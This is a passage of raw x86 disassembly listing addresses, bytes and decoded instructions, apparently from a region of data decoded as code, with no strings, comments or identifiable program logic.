  406a01:	25 00 00 00 00       	and    $0x0,%eax
  406a06:	96                   	xchg   %eax,%esi
  406a07:	00 48 0c             	add    %cl,0xc(%eax)
  406a0a:	b8 02 5e 00 4c       	mov    $0x4c005e02,%eax
  406a0f:	55                   	push   %ebp
  406a10:	00 00                	add    %al,(%eax)
  406a12:	00 00                	add    %al,(%eax)
  406a14:	96                   	xchg   %eax,%esi
  406a15:	00 48 0c             	add    %cl,0xc(%eax)
  406a18:	be 02 5f 00 78       	mov    $0x78005f02,%esi
  406a1d:	20 00                	and    %al,(%eax)
  406a1f:	00 00                	add    %al,(%eax)
  406a21:	00 86 18 09 15 0e    	add    %al,0xe150918(%esi)
  406a27:	00 61 00             	add    %ah,0x0(%ecx)
  406a2a:	9e                   	sahf
  406a2b:	25 00 00 00 00       	and    $0x0,%eax
  406a30:	96                   	xchg   %eax,%esi
  406a31:	00 49 0f             	add    %cl,0xf(%ecx)
  406a34:	c5 02                	lds    (%edx),%eax
  406a36:	61                   	popa
  406a37:	00 0c 56             	add    %cl,(%esi,%edx,2)
  406a3a:	00 00                	add    %al,(%eax)
  406a3c:	00 00                	add    %al,(%eax)
  406a3e:	96                   	xchg   %eax,%esi
  406a3f:	00 62 0c             	add    %ah,0xc(%edx)
  406a42:	cb                   	lret
  406a43:	02 62 00             	add    0x0(%edx),%ah
  406a46:	d4 56                	aam    $0x56
  406a48:	00 00                	add    %al,(%eax)
  406a4a:	00 00                	add    %al,(%eax)
  406a4c:	96                   	xchg   %eax,%esi
  406a4d:	00 3e                	add    %bh,(%esi)
  406a4f:	1d d2 02 64 00       	sbb    $0x6402d2,%eax
  406a54:	ab                   	stos   %eax,%es:(%edi)
  406a55:	25 00 00 00 00       	and    $0x0,%eax
  406a5a:	96                   	xchg   %eax,%esi
  406a5b:	00 df                	add    %bl,%bh
  406a5d:	18 da                	sbb    %bl,%dl
  406a5f:	02 66 00             	add    0x0(%esi),%ah
  406a62:	c6                   	(bad)
  406a63:	25 00 00 00 00       	and    $0x0,%eax
  406a68:	96                   	xchg   %eax,%esi
  406a69:	00 2f                	add    %ch,(%edi)
  406a6b:	06                   	push   %es
  406a6c:	e1 02                	loope  0x406a70
  406a6e:	68 00 e6 25 00       	push   $0x25e600
  406a73:	00 00                	add    %al,(%eax)
  406a75:	00 96 00 6c 10 e8    	add    %dl,-0x17ef9400(%esi)
  406a7b:	02 6a 00             	add    0x0(%edx),%ch
  406a7e:	74 57                	je     0x406ad7
  406a80:	00 00                	add    %al,(%eax)
  406a82:	00 00                	add    %al,(%eax)
  406a84:	96                   	xchg   %eax,%esi
  406a85:	00 ab 00 ef 02 6c    	add    %ch,0x6c02ef00(%ebx)
  406a8b:	00 a4 57 00 00 00 00 	add    %ah,0x0(%edi,%edx,2)
  406a92:	96                   	xchg   %eax,%esi
  406a93:	00 ac 13 f6 02 6e 00 	add    %ch,0x6e02f6(%ebx,%edx,1)
  406a9a:	78 20                	js     0x406abc
  406a9c:	00 00                	add    %al,(%eax)
  406a9e:	00 00                	add    %al,(%eax)
  406aa0:	86 18                	xchg   %bl,(%eax)
  406aa2:	09 15 0e 00 70 00    	or     %edx,0x70000e
  406aa8:	e8 58 00 00 00       	call   0x406b05
  406aad:	00 96 00 6f 18 84    	add    %dl,-0x7be79100(%esi)
  406ab3:	01 70 00             	add    %esi,0x0(%eax)
  406ab6:	74 59                	je     0x406b11
  406ab8:	00 00                	add    %al,(%eax)
  406aba:	00 00                	add    %al,(%eax)
  406abc:	96                   	xchg   %eax,%esi
  406abd:	00 66 18             	add    %ah,0x18(%esi)
  406ac0:	84 01                	test   %al,(%ecx)
  406ac2:	71 00                	jno    0x406ac4
  406ac4:	00 00                	add    %al,(%eax)
  406ac6:	01 00                	add    %eax,(%eax)
  406ac8:	cb                   	lret
  406ac9:	0a 00                	or     (%eax),%al
  406acb:	00 01                	add    %al,(%ecx)
  406acd:	00 cb                	add    %cl,%bl
  406acf:	0a 00                	or     (%eax),%al
  406ad1:	00 01                	add    %al,(%ecx)
  406ad3:	00 cb                	add    %cl,%bl
  406ad5:	0a 00                	or     (%eax),%al
  406ad7:	00 01                	add    %al,(%ecx)
  406ad9:	00 cb                	add    %cl,%bl
  406adb:	0a 00                	or     (%eax),%al
  406add:	00 01                	add    %al,(%ecx)
  406adf:	00 cb                	add    %cl,%bl
  406ae1:	0a 00                	or     (%eax),%al
  406ae3:	00 01                	add    %al,(%ecx)
  406ae5:	00 cb                	add    %cl,%bl
  406ae7:	0a 00                	or     (%eax),%al
  406ae9:	00 01                	add    %al,(%ecx)
  406aeb:	00 cb                	add    %cl,%bl
  406aed:	0a 00                	or     (%eax),%al
  406aef:	00 01                	add    %al,(%ecx)
  406af1:	00 cb                	add    %cl,%bl
  406af3:	0a 00                	or     (%eax),%al
  406af5:	00 01                	add    %al,(%ecx)
  406af7:	00 cb                	add    %cl,%bl
  406af9:	0a 00                	or     (%eax),%al
  406afb:	00 01                	add    %al,(%ecx)
  406afd:	00 cb                	add    %cl,%bl
  406aff:	0a 00                	or     (%eax),%al
  406b01:	00 01                	add    %al,(%ecx)
  406b03:	00 ac 07 00 00 01 00 	add    %ch,0x10000(%edi,%eax,1)
  406b0a:	56                   	push   %esi
  406b0b:	13 00                	adc    (%eax),%eax
  406b0d:	00 02                	add    %al,(%edx)
  406b0f:	00 b1 08 00 00 03    	add    %dh,0x3000008(%ecx)
  406b15:	00 b4 10 00 00 04 00 	add    %dh,0x40000(%eax,%edx,1)
  406b1c:	26 18 00             	sbb    %al,%es:(%eax)
  406b1f:	00 01                	add    %al,(%ecx)
  406b21:	00 d6                	add    %dl,%dh
  406b23:	12 00                	adc    (%eax),%al
  406b25:	00 01                	add    %al,(%ecx)
  406b27:	00 1d 0d 00 00 01    	add    %bl,0x100000d
  406b2d:	00 c3                	add    %al,%bl
  406b2f:	0d 00 00 01 00       	or     $0x10000,%eax
  406b34:	c3                   	ret
  406b35:	0d 00 00 01 00       	or     $0x10000,%eax
  406b3a:	2d 0d 00 00 01       	sub    $0x100000d,%eax
  406b3f:	00 d8                	add    %bl,%al
  406b41:	18 00                	sbb    %al,(%eax)
  406b43:	00 01                	add    %al,(%ecx)
  406b45:	00 c9                	add    %cl,%cl
  406b47:	04 00                	add    $0x0,%al
  406b49:	00 02                	add    %al,(%edx)
  406b4b:	00 01                	add    %al,(%ecx)
  406b4d:	1c 00                	sbb    $0x0,%al
  406b4f:	00 03                	add    %al,(%ebx)
  406b51:	00 66 1b             	add    %ah,0x1b(%esi)
  406b54:	00 00                	add    %al,(%eax)
  406b56:	01 00                	add    %eax,(%eax)
  406b58:	34 07                	xor    $0x7,%al
  406b5a:	00 00                	add    %al,(%eax)
  406b5c:	01 00                	add    %eax,(%eax)
  406b5e:	41                   	inc    %ecx
  406b5f:	18 00                	sbb    %al,(%eax)
  406b61:	00 02                	add    %al,(%edx)
  406b63:	00 24 1b             	add    %ah,(%ebx,%ebx,1)
  406b66:	00 00                	add    %al,(%eax)
  406b68:	01 00                	add    %eax,(%eax)
  406b6a:	ff 16                	call   *(%esi)
  406b6c:	00 00                	add    %al,(%eax)
  406b6e:	01 00                	add    %eax,(%eax)
  406b70:	35 00 00 00 02       	xor    $0x2000000,%eax
  406b75:	00 a5 00 00 00 03    	add    %ah,0x3000000(%ebp)
  406b7b:	00 a8 00 00 00 01    	add    %ch,0x1000000(%eax)
  406b81:	00 56 13             	add    %dl,0x13(%esi)
  406b84:	00 00                	add    %al,(%eax)
  406b86:	02 00                	add    (%eax),%al
  406b88:	6f                   	outsl  %ds:(%esi),(%dx)
  406b89:	0b 00                	or     (%eax),%eax
  406b8b:	00 01                	add    %al,(%ecx)
  406b8d:	00 ac 07 00 00 02 00 	add    %ch,0x20000(%edi,%eax,1)
  406b94:	cb                   	lret
  406b95:	0a 00                	or     (%eax),%al
  406b97:	00 01                	add    %al,(%ecx)
  406b99:	00 cb                	add    %cl,%bl
  406b9b:	0a 00                	or     (%eax),%al
  406b9d:	00 01                	add    %al,(%ecx)
  406b9f:	00 ac 07 00 00 01 00 	add    %ch,0x10000(%edi,%eax,1)
  406ba6:	bd 02 00 00 01       	mov    $0x1000002,%ebp
  406bab:	00 2a                	add    %ch,(%edx)
  406bad:	0e                   	push   %cs
  406bae:	00 00                	add    %al,(%eax)
  406bb0:	01 00                	add    %eax,(%eax)
  406bb2:	49                   	dec    %ecx
  406bb3:	1c 00                	sbb    $0x0,%al
  406bb5:	00 01                	add    %al,(%ecx)
  406bb7:	00 e5                	add    %ah,%ch
  406bb9:	1c 00                	sbb    $0x0,%al
  406bbb:	00 01                	add    %al,(%ecx)
  406bbd:	00 b9 1b 00 00 01    	add    %bh,0x100001b(%ecx)
  406bc3:	00 b9 1b 00 00 01    	add    %bh,0x100001b(%ecx)
  406bc9:	00 b9 1b 00 00 01    	add    %bh,0x100001b(%ecx)
  406bcf:	00 b9 1b 00 00 01    	add    %bh,0x100001b(%ecx)
  406bd5:	00 32                	add    %dh,(%edx)
  406bd7:	00 00                	add    %al,(%eax)
  406bd9:	00 02                	add    %al,(%edx)
  406bdb:	00 87 00 00 00 01    	add    %al,0x1000000(%edi)
  406be1:	00 b9 1b 00 00 01    	add    %bh,0x100001b(%ecx)
  406be7:	00 b9 1b 00 00 01    	add    %bh,0x100001b(%ecx)
  406bed:	00 c3                	add    %al,%bl
  406bef:	18 00                	sbb    %al,(%eax)
  406bf1:	00 01                	add    %al,(%ecx)
  406bf3:	00 53 16             	add    %dl,0x16(%ebx)
  406bf6:	00 00                	add    %al,(%eax)
  406bf8:	01 00                	add    %eax,(%eax)
  406bfa:	cf                   	iret
  406bfb:	16                   	push   %ss
  406bfc:	00 00                	add    %al,(%eax)
  406bfe:	01 00                	add    %eax,(%eax)
  406c00:	cf                   	iret
  406c01:	16                   	push   %ss
  406c02:	00 00                	add    %al,(%eax)
  406c04:	01 00                	add    %eax,(%eax)
  406c06:	06                   	push   %es
  406c07:	1c 00                	sbb    $0x0,%al
  406c09:	00 01                	add    %al,(%ecx)
  406c0b:	00 06                	add    %al,(%esi)
  406c0d:	1c 00                	sbb    $0x0,%al
  406c0f:	00 01                	add    %al,(%ecx)
  406c11:	00 06                	add    %al,(%esi)
  406c13:	1c 00                	sbb    $0x0,%al
  406c15:	00 01                	add    %al,(%ecx)
  406c17:	00 06                	add    %al,(%esi)
  406c19:	1c 00                	sbb    $0x0,%al
  406c1b:	00 01                	add    %al,(%ecx)
  406c1d:	00 06                	add    %al,(%esi)
  406c1f:	1c 00                	sbb    $0x0,%al
  406c21:	00 01                	add    %al,(%ecx)
  406c23:	00 c3                	add    %al,%bl
  406c25:	0d 00 00 01 00       	or     $0x10000,%eax
  406c2a:	b0 0d                	mov    $0xd,%al
  406c2c:	00 00                	add    %al,(%eax)
  406c2e:	02 00                	add    (%eax),%al
  406c30:	bb 0d 00 00 01       	mov    $0x100000d,%ebx
  406c35:	00 cb                	add    %cl,%bl
  406c37:	0a 00                	or     (%eax),%al
  406c39:	00 01                	add    %al,(%ecx)
  406c3b:	00 cb                	add    %cl,%bl
  406c3d:	0a 00                	or     (%eax),%al
  406c3f:	00 01                	add    %al,(%ecx)
  406c41:	00 cb                	add    %cl,%bl
  406c43:	0a 00                	or     (%eax),%al
  406c45:	00 01                	add    %al,(%ecx)
  406c47:	00 2f                	add    %ch,(%edi)
  406c49:	1c 00                	sbb    $0x0,%al
  406c4b:	00 01                	add    %al,(%ecx)
  406c4d:	00 cb                	add    %cl,%bl
  406c4f:	0a 00                	or     (%eax),%al
  406c51:	00 01                	add    %al,(%ecx)
  406c53:	00 ac 07 00 00 01 00 	add    %ch,0x10000(%edi,%eax,1)
  406c5a:	ac                   	lods   %ds:(%esi),%al
  406c5b:	07                   	pop    %es
  406c5c:	00 00                	add    %al,(%eax)
  406c5e:	01 00                	add    %eax,(%eax)
  406c60:	c0 17 00             	rclb   $0x0,(%edi)
  406c63:	00 01                	add    %al,(%ecx)
  406c65:	00 c0                	add    %al,%al
  406c67:	17                   	pop    %ss
  406c68:	00 00                	add    %al,(%eax)
  406c6a:	01 00                	add    %eax,(%eax)
  406c6c:	cb                   	lret
  406c6d:	0a 00                	or     (%eax),%al
  406c6f:	00 01                	add    %al,(%ecx)
  406c71:	00 cb                	add    %cl,%bl
  406c73:	0a 00                	or     (%eax),%al
  406c75:	00 01                	add    %al,(%ecx)
  406c77:	00 cb                	add    %cl,%bl
  406c79:	0a 00                	or     (%eax),%al
  406c7b:	00 01                	add    %al,(%ecx)
  406c7d:	00 fc                	add    %bh,%ah
  406c7f:	1c 00                	sbb    $0x0,%al
  406c81:	00 02                	add    %al,(%edx)
  406c83:	00 cb                	add    %cl,%bl
  406c85:	0a 00                	or     (%eax),%al
  406c87:	00 01                	add    %al,(%ecx)
  406c89:	00 fc                	add    %bh,%ah
  406c8b:	1c 00                	sbb    $0x0,%al
  406c8d:	00 02                	add    %al,(%edx)
  406c8f:	00 cb                	add    %cl,%bl
  406c91:	0a 00                	or     (%eax),%al
  406c93:	00 01                	add    %al,(%ecx)
  406c95:	00 2b                	add    %ch,(%ebx)
  406c97:	07                   	pop    %es
  406c98:	00 00                	add    %al,(%eax)
  406c9a:	01 00                	add    %eax,(%eax)
  406c9c:	2b 07                	sub    (%edi),%eax
  406c9e:	00 00                	add    %al,(%eax)
  406ca0:	01 00                	add    %eax,(%eax)
  406ca2:	6f                   	outsl  %ds:(%esi),(%dx)
  406ca3:	0d 00 00 01 00       	or     $0x10000,%eax
  406ca8:	cb                   	lret
  406ca9:	0a 00                	or     (%eax),%al
  406cab:	00 01                	add    %al,(%ecx)
  406cad:	00 70 0e             	add    %dh,0xe(%eax)
  406cb0:	00 00                	add    %al,(%eax)
  406cb2:	01 00                	add    %eax,(%eax)
  406cb4:	75 0e                	jne    0x406cc4
  406cb6:	00 00                	add    %al,(%eax)
  406cb8:	01 00                	add    %eax,(%eax)
  406cba:	75 0e                	jne    0x406cca
  406cbc:	00 00                	add    %al,(%eax)
  406cbe:	01 00                	add    %eax,(%eax)
  406cc0:	cf                   	iret
  406cc1:	16                   	push   %ss
  406cc2:	00 00                	add    %al,(%eax)
  406cc4:	01 00                	add    %eax,(%eax)
  406cc6:	2b 07                	sub    (%edi),%eax
  406cc8:	00 00                	add    %al,(%eax)
  406cca:	01 00                	add    %eax,(%eax)
  406ccc:	c0 17 00             	rclb   $0x0,(%edi)
  406ccf:	00 01                	add    %al,(%ecx)
  406cd1:	00 c0                	add    %al,%al
  406cd3:	17                   	pop    %ss
  406cd4:	00 00                	add    %al,(%eax)
  406cd6:	01 00                	add    %eax,(%eax)
  406cd8:	cb                   	lret
  406cd9:	0a 00                	or     (%eax),%al
  406cdb:	00 01                	add    %al,(%ecx)
  406cdd:	00 cb                	add    %cl,%bl
  406cdf:	0a 00                	or     (%eax),%al
  406ce1:	00 01                	add    %al,(%ecx)
  406ce3:	00 cb                	add    %cl,%bl
  406ce5:	0a 00                	or     (%eax),%al
  406ce7:	00 01                	add    %al,(%ecx)
  406ce9:	00 c0                	add    %al,%al
  406ceb:	17                   	pop    %ss
  406cec:	00 00                	add    %al,(%eax)
  406cee:	02 00                	add    (%eax),%al
  406cf0:	98                   	cwtl
  406cf1:	10 00                	adc    %al,(%eax)
  406cf3:	00 01                	add    %al,(%ecx)
  406cf5:	00 c0                	add    %al,%al
  406cf7:	17                   	pop    %ss
  406cf8:	00 00                	add    %al,(%eax)
  406cfa:	01 00                	add    %eax,(%eax)
  406cfc:	79 0b                	jns    0x406d09
  406cfe:	00 00                	add    %al,(%eax)
  406d00:	02 00                	add    (%eax),%al
  406d02:	c0 17 00             	rclb   $0x0,(%edi)
  406d05:	00 01                	add    %al,(%ecx)
  406d07:	00 c0                	add    %al,%al
  406d09:	17                   	pop    %ss
  406d0a:	00 00                	add    %al,(%eax)
  406d0c:	01 00                	add    %eax,(%eax)
  406d0e:	c0 17 00             	rclb   $0x0,(%edi)
  406d11:	00 02                	add    %al,(%edx)
  406d13:	00 7f 0e             	add    %bh,0xe(%edi)
  406d16:	00 00                	add    %al,(%eax)
  406d18:	01 00                	add    %eax,(%eax)
  406d1a:	c0 17 00             	rclb   $0x0,(%edi)
  406d1d:	00 02                	add    %al,(%edx)
  406d1f:	00 c6                	add    %al,%dh
  406d21:	16                   	push   %ss
  406d22:	00 00                	add    %al,(%eax)
  406d24:	01 00                	add    %eax,(%eax)
  406d26:	c0 17 00             	rclb   $0x0,(%edi)
  406d29:	00 02                	add    %al,(%edx)
  406d2b:	00 75 0e             	add    %dh,0xe(%ebp)
  406d2e:	00 00                	add    %al,(%eax)
  406d30:	01 00                	add    %eax,(%eax)
  406d32:	c0 17 00             	rclb   $0x0,(%edi)
  406d35:	00 02                	add    %al,(%edx)
  406d37:	00 75 0e             	add    %dh,0xe(%ebp)
  406d3a:	00 00                	add    %al,(%eax)
  406d3c:	01 00                	add    %eax,(%eax)
  406d3e:	c0 17 00             	rclb   $0x0,(%edi)
  406d41:	00 02                	add    %al,(%edx)
  406d43:	00 70 0e             	add    %dh,0xe(%eax)
  406d46:	00 00                	add    %al,(%eax)
  406d48:	01 00                	add    %eax,(%eax)
  406d4a:	c0 17 00             	rclb   $0x0,(%edi)
  406d4d:	00 02                	add    %al,(%edx)
  406d4f:	00 7a 0e             	add    %bh,0xe(%edx)
  406d52:	00 00                	add    %al,(%eax)
  406d54:	01 00                	add    %eax,(%eax)
  406d56:	c0 17 00             	rclb   $0x0,(%edi)
  406d59:	00 02                	add    %al,(%edx)
  406d5b:	00 7a 0e             	add    %bh,0xe(%edx)
  406d5e:	00 00                	add    %al,(%eax)
  406d60:	01 00                	add    %eax,(%eax)
  406d62:	b9 1b 00 00 01       	mov    $0x100001b,%ecx
  406d67:	00 b9 1b 16 00 59    	add    %bh,0x5900161b(%ecx)
  406d6d:	00 18                	add    %bl,(%eax)
  406d6f:	00 5d 00             	add    %bl,0x0(%ebp)
  406d72:	b1 00                	mov    $0x0,%cl
  406d74:	f2 1a bb 01 b1 00 de 	repnz sbb -0x21ff4eff(%ebx),%bh
  406d7b:	1b bf 01 b1 00 cd    	sbb    -0x32ff4eff(%edi),%edi
  406d81:	19 0e                	sbb    %ecx,(%esi)
  406d83:	00 b9 00 f1 14 64    	add    %bh,0x6414f100(%ecx)
  406d89:	02 c9                	add    %cl,%cl
  406d8b:	00 09                	add    %cl,(%ecx)
  406d8d:	15 01 03 d1 00       	adc    $0xd10301,%eax
  406d92:	09 15 0e 00 d9 00    	or     %edx,0xd9000e
  406d98:	09 15 2e 03 e9 00    	or     %edx,0xe9032e
  406d9e:	09 15 6b 01 f1 00    	or     %edx,0xf1016b
  406da4:	09 15 6b 01 f9 00    	or     %edx,0xf9016b
  406daa:	09 15 6b 01 01 01    	or     %edx,0x101016b
  406db0:	09 15 6b 01 09 01    	or     %edx,0x109016b
  406db6:	09 15 6b 01 11 01    	or     %edx,0x111016b
  406dbc:	09 15 6b 01 19 01    	or     %edx,0x119016b
  406dc2:	09 15 6b 01 21 01    	or     %edx,0x121016b
  406dc8:	09 15 6b 01 29 01    	or     %edx,0x129016b
  406dce:	09 15 6b 01 31 01    	or     %edx,0x131016b
  406dd4:	09 15 4b 02 39 01    	or     %edx,0x139024b
  406dda:	09 15 0e 00 41 01    	or     %edx,0x141000e
  406de0:	09 15 6b 01 49 01    	or     %edx,0x149016b
  406de6:	88 12                	mov    %dl,(%edx)
  406de8:	7f 00                	jg     0x406dea
  406dea:	51                   	push   %ecx
  406deb:	01 6e 00             	add    %ebp,0x0(%esi)
  406dee:	c4 03                	les    (%ebx),%eax
  406df0:	59                   	pop    %ecx
  406df1:	01 f7                	add    %esi,%edi
  406df3:	19 7f 00             	sbb    %edi,0x0(%edi)
  406df6:	51                   	push   %ecx
  406df7:	01 79 10             	add    %edi,0x10(%ecx)
  406dfa:	84 00                	test   %al,(%eax)
  406dfc:	09 00                	or     %eax,(%eax)
  406dfe:	09 15 0e 00 61 01    	or     %edx,0x161000e
  406e04:	41                   	inc    %ecx
  406e05:	01 cd                	add    %ecx,%ebp
  406e07:	03 51 01             	add    0x1(%ecx),%edx
  406e0a:	28 0c 2a             	sub    %cl,(%edx,%ebp,1)
  406e0d:	01 61 01             	add    %esp,0x1(%ecx)
  406e10:	b7 0c                	mov    $0xc,%bh
  406e12:	d3 03                	roll   %cl,(%ebx)
  406e14:	11 00                	adc    %eax,(%eax)
  406e16:	09 15 2b 02 11 00    	or     %edx,0x11022b
  406e1c:	ce                   	into
  406e1d:	1c d9                	sbb    $0xd9,%al
  406e1f:	03 69 01             	add    0x1(%ecx),%ebp
  406e22:	99                   	cltd
  406e23:	1c df                	sbb    $0xdf,%al
  406e25:	03 61 01             	add    0x1(%ecx),%esp
  406e28:	bd 16 e5 03 81       	mov    $0x8103e516,%ebp
  406e2d:	01 ec                	add    %ebp,%esp
  406e2f:	01 c7                	add    %eax,%edi
  406e31:	00 79 01             	add    %bh,0x1(%ecx)
  406e34:	3f                   	aas
  406e35:	0d eb 03 19 00       	or     $0x1903eb,%eax
  406e3a:	09 15 09 04 19 00    	or     %edx,0x190409
  406e40:	4f                   	dec    %edi
  406e41:	0b 01                	or     (%ecx),%eax
  406e43:	03 19                	add    (%ecx),%ebx
  406e45:	00 3c 0b             	add    %bh,(%ebx,%ecx,1)
  406e48:	01 03                	add    %eax,(%ebx)
  406e4a:	c1 01 73             	roll   $0x73,(%ecx)
  406e4d:	1d 16 04 c1 01       	sbb    $0x1c10416,%eax
  406e52:	e9 19 1c 04 d1       	jmp    0xd1448a70
  406e57:	01 09                	add    %ecx,(%ecx)
  406e59:	15 0e 00 d1 01       	adc    $0x1d1000e,%eax
  406e5e:	e2 1b                	loop   0x406e7b
  406e60:	23 04 d9             	and    (%ecx,%ebx,8),%eax
  406e63:	01 fa                	add    %edi,%edx
  406e65:	15 28 04 19 00       	adc    $0x190428,%eax
  406e6a:	50                   	push   %eax
  406e6b:	19 30                	sbb    %esi,(%eax)
  406e6d:	04 19                	add    $0x19,%al
  406e6f:	00 3e                	add    %bh,(%esi)
  406e71:	03 bf 01 19 00 50    	add    0x50001901(%edi),%edi
  406e77:	19 3c 02             	sbb    %edi,(%edx,%eax,1)
  406e7a:	99                   	cltd
  406e7b:	01 09                	add    %ecx,(%ecx)
  406e7d:	15 0e 00 a1 01       	adc    $0x1a1000e,%eax
  406e82:	09 15 36 02 99 01    	or     %edx,0x1990236
  406e88:	6a 17                	push   $0x17
  406e8a:	38 04 99             	cmp    %al,(%ecx,%ebx,4)
  406e8d:	01 53 0c             	add    %edx,0xc(%ebx)
  406e90:	70 01                	jo     0x406e93
  406e92:	c1 01 e9             	roll   $0xe9,(%ecx)
  406e95:	19 3f                	sbb    %edi,(%edi)
  406e97:	04 d1                	add    $0xd1,%al
  406e99:	01 e2                	add    %esp,%edx
  406e9b:	1b 49 04             	sbb    0x4(%ecx),%ecx
  406e9e:	f1                   	int1
  406e9f:	01 6e 08             	add    %ebp,0x8(%esi)
  406ea2:	0e                   	push   %cs
  406ea3:	00 f9                	add    %bh,%cl
  406ea5:	01 09                	add    %ecx,(%ecx)
  406ea7:	15 4f 04 01 02       	adc    $0x201044f,%eax
  406eac:	09 15 56 04 21 00    	or     %edx,0x210456
  406eb2:	09 15 5c 04 19 00    	or     %edx,0x19045c
  406eb8:	36 1b 66 04          	sbb    %ss:0x4(%esi),%esp
  406ebc:	09 00                	or     %eax,(%eax)
  406ebe:	6e                   	outsb  %ds:(%esi),(%dx)
  406ebf:	0c 47                	or     $0x47,%al
  406ec1:	02 21                	add    (%ecx),%ah
  406ec3:	00 72 1a             	add    %dh,0x1a(%edx)
  406ec6:	6c                   	insb   (%dx),%es:(%edi)
  406ec7:	04 29                	add    $0x29,%al
  406ec9:	02 09                	add    (%ecx),%cl
  406ecb:	15 56 04 29 00       	adc    $0x290456,%eax
  406ed0:	09 15 78 04 31 02    	or     %edx,0x2310478
  406ed6:	09 15 56 04 c1 00    	or     %edx,0xc10456
  406edc:	11 03                	adc    %eax,(%ebx)
  406ede:	82 04 39 02          	addb   $0x2,(%ecx,%edi,1)
  406ee2:	9e                   	sahf
  406ee3:	07                   	pop    %es
  406ee4:	8f 04 31             	pop    (%ecx,%esi,1)
  406ee7:	00 7a 17             	add    %bh,0x17(%edx)
  406eea:	96                   	xchg   %eax,%esi
  406eeb:	04 c1                	add    $0xc1,%al
  406eed:	00 6e 08             	add    %ch,0x8(%esi)
  406ef0:	0e                   	push   %cs
  406ef1:	00 19                	add    %bl,(%ecx)
  406ef3:	00 6e 08             	add    %ch,0x8(%esi)
  406ef6:	0e                   	push   %cs
  406ef7:	00 29                	add    %ch,(%ecx)
  406ef9:	00 6e 08             	add    %ch,0x8(%esi)
  406efc:	0e                   	push   %cs
  406efd:	00 c1                	add    %al,%cl
  406eff:	00 09                	add    %cl,(%ecx)
  406f01:	03 a1 04 49 02 6e    	add    0x6e024904(%ecx),%esp
  406f07:	00 a7 04 c1 00 16    	add    %ah,0x1600c104(%edi)
  406f0d:	03 ae 04 51 02 09    	add    0x9025104(%esi),%ebp
  406f13:	15 56 04 49 01       	adc    $0x1490456,%eax
  406f18:	09 15 b6 04 49 01    	or     %edx,0x14904b6
  406f1e:	9b                   	fwait
  406f1f:	1b bd 04 61 02 8a    	sbb    -0x75fd9efc(%ebp),%edi
  406f25:	14 cf                	adc    $0xcf,%al
  406f27:	04 49                	add    $0x49,%al
  406f29:	02 bd 16 9f 01 19    	add    0x19019f16(%ebp),%bh
  406f2f:	00 44 0f d6          	add    %al,-0x2a(%edi,%ecx,1)
  406f33:	04 c1                	add    $0xc1,%al
  406f35:	00 ec                	add    %ch,%ah
  406f37:	08 de                	or     %bl,%dh
  406f39:	04 59                	add    $0x59,%al
  406f3b:	02 09                	add    (%ecx),%cl
  406f3d:	15 2b 02 c1 00       	adc    $0xc1022b,%eax
  406f42:	b0 11                	mov    $0x11,%al
  406f44:	15 02 c1 00 4a       	adc    $0x4a00c102,%eax
  406f49:	0d 0e 00 61 02       	or     $0x261000e,%eax
  406f4e:	f7 19                	negl   (%ecx)
  406f50:	9a 00 71 02 48 19 0a 	lcall  $0xa19,$0x48027100
  406f57:	00 59 01             	add    %bl,0x1(%ecx)
  406f5a:	d2 15 c7 00 a1 02    	rclb   %cl,0x2a100c7
  406f60:	e6 07                	out    %al,$0x7
  406f62:	01 05 79 02 09 15    	add    %eax,0x15090279
  406f68:	6b 01 81             	imul   $0xffffff81,(%ecx),%eax
  406f6b:	02 4a 18             	add    0x18(%edx),%cl
  406f6e:	07                   	pop    %es
  406f6f:	05 81 02 ac 06       	add    $0x6ac0281,%eax
  406f74:	0d 05 a9 02 f5       	or     $0xf502a905,%eax
  406f79:	06                   	push   %es
  406f7a:	47                   	inc    %edi
  406f7b:	02 b1 02 60 07 47    	add    0x47076002(%ecx),%dh
  406f81:	02 c1                	add    %cl,%al
  406f83:	01 7f 1d             	add    %edi,0x1d(%edi)
  406f86:	16                   	push   %ss
  406f87:	04 81                	add    $0x81,%al
  406f89:	02 ed                	add    %ch,%ch
  406f8b:	15 13 05 81 02       	adc    $0x2810513,%eax
  406f90:	3f                   	aas
  406f91:	0f 0e                	femms
  406f93:	00 89 02 09 15 0e    	add    %cl,0xe150902(%ecx)
  406f99:	00 89 02 02 07 6b    	add    %cl,0x6b070202(%ecx)
  406f9f:	01 b1 02 ec 06 47    	add    %esi,0x4706ec02(%ecx)
  406fa5:	02 a1 02 ec 10 c7    	add    -0x38ef13fe(%ecx),%ah
  406fab:	00 c1                	add    %al,%cl
  406fad:	01 c5                	add    %eax,%ebp
  406faf:	18 1a                	sbb    %bl,(%edx)
  406fb1:	05 89 02 8d 18       	add    $0x188d0289,%eax
  406fb6:	6b 01 89             	imul   $0xffffff89,(%ecx),%eax
  406fb9:	02 c9                	add    %cl,%cl
  406fbb:	06                   	push   %es
  406fbc:	20 05 89 02 1c 1c    	and    %al,0x1c1c0289
  406fc2:	4b                   	dec    %ebx
  406fc3:	02 81 02 9b 1b 27    	add    0x271b9b02(%ecx),%al
  406fc9:	05 c1 02 66 14       	add    $0x146602c1,%eax
  406fce:	30 05 c9 02 7c 08    	xor    %al,0x87c02c9
  406fd4:	c7 00 91 02 c3 1c    	movl   $0x1cc30291,(%eax)
  406fda:	35 05 c1 01 c5       	xor    $0xc501c105,%eax
  406fdf:	18 3f                	sbb    %bh,(%edi)
  406fe1:	05 91 02 c2 0a       	add    $0xac20291,%eax
  406fe6:	46                   	inc    %esi
  406fe7:	05 d9 02 ae 18       	add    $0x18ae02d9,%eax
  406fec:	84 00                	test   %al,(%eax)
  406fee:	d9 02                	flds   (%edx)
  406ff0:	dc 08                	fmull  (%eax)
  406ff2:	3e 01 e1             	ds add %esp,%ecx
  406ff5:	02 09                	add    (%ecx),%cl
  406ff7:	15 4c 05 d9 02       	adc    $0x2d9054c,%eax
  406ffc:	70 16                	jo     0x407014
  406ffe:	2a 01                	sub    (%ecx),%al
  407000:	a1 02 0f 07 c3       	mov    0xc3070f02,%eax
  407005:	00 c1                	add    %al,%cl
  407007:	01 c5                	add    %eax,%ebp
  407009:	18 01                	sbb    %al,(%ecx)
  40700b:	05 99 02 09 15       	add    $0x15090299,%eax
  407010:	6b 01 f1             	imul   $0xfffffff1,(%ecx),%eax
  407013:	02 dc                	add    %ah,%bl
  407015:	07                   	pop    %es
  407016:	6b 01 a1             	imul   $0xffffffa1,(%ecx),%eax
  407019:	02 63 0d             	add    0xd(%ebx),%ah
  40701c:	c3                   	ret
  40701d:	00 a1 02 1f 07 c7    	add    %ah,-0x38f8e0fe(%ecx)
  407023:	00 89 02 0d 0d 4b    	add    %cl,0x4b0d0d02(%ecx)
